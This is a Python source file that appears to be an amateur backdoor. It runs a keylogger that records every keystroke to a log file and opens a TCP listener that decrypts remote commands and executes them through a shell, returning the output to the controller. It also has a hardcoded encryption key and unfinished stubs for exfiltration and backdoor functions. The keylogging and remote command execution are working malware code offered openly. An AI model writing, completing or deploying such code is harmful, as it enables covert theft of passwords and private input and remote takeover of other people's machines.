import sys,os, subprocess
#from scapy.all import *
import socket
from Dependencies import pyxhook
from cryptography.fernet import Fernet

TCP_IP = ''
TCP_PORT = 8045
TCP_EXFIL=8046
log_file='/home/darthvader/Documents/file.log'
key = b'EzBmzsJH6VogpmXpxI-bJS8xXgXMGgC2T_How8q24_w='

#code to initialize and run keylogger
def OnKeyPress(event):
  fob=open(log_file,'a')
  fob.write(event.Key)
  fob.write('\n')

  if event.Ascii==96: #96 is the ascii value of the grave key (`)
    fob.close()
    new_hook.cancel()
#instantiate HookManager class
new_hook=pyxhook.HookManager()
#listen to all keystrokes
new_hook.KeyDown=OnKeyPress
#hook the keyboard
new_hook.HookKeyboard()
#start the session
new_hook.start()


def server(port,host):
    print ("In server")
    #clientsocket=socket.socket(socket.AF_INET, socket.SOCK_STREAM) #create socket
    #clientsocket.connect((host,port))
	#Listen for connections from the client 
	#If packet received is from the client, process it 

def choice(option): #Processing the choice entered
    if option==1:exfil()
    elif option==2:bakdoor()
    elif option==3:keylog()
    elif option==4:kill_backdoor()
    elif option==5:kill_client()
    else : print("Server can not process the choice entered")

def sendchoice(choices):
    print ("You chose: " + str(choices))

def decryptmsg(crypt):
	f=Fernet(key)
	token=f.decrypt(crypt)
	return token

def exfil():
	print("In Exfil")
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind((TCP_IP, TCP_EXFIL))
	s.listen(1)
	conn, addr = s.accept()

def bakdoor():
	print("In backdoor")
	

def keylog():
    print("In Keylog")
    
    #send keylog file log_file to client
    

def kill_backdoor():
    print("Killing backdoor")

def kill_client():
    print("Killing client")

def listener():
	print("In Listener")
	BUFFER_SIZE = 10000
	    
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind((TCP_IP, TCP_PORT))
	s.listen(1)
	conn, addr = s.accept()
	#############
	#conn.sendall(("Target Locked").encode())
	#conn.send("\nStart sending commands\n")
	#############
	while 1:
		data = decryptmsg(conn.recv(1024).strip())        # read the client message
		print(data.decode())
		if data.decode()=="exit": conn.sendall(("closing backdoor").encode())
		elif data.decode()=="exfil":exfil()
		elif data.decode()=="keylogger":keylog()
		elif not data: break                  # Echo it back
		else:
			proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) #This command runs processes. 
			stdoutput = proc.stdout.read() + proc.stderr.read()
			#print(stdoutput.decode())
			###Add encryption here###
			conn.sendall(stdoutput)
	#exit 
	conn.close()
listener()
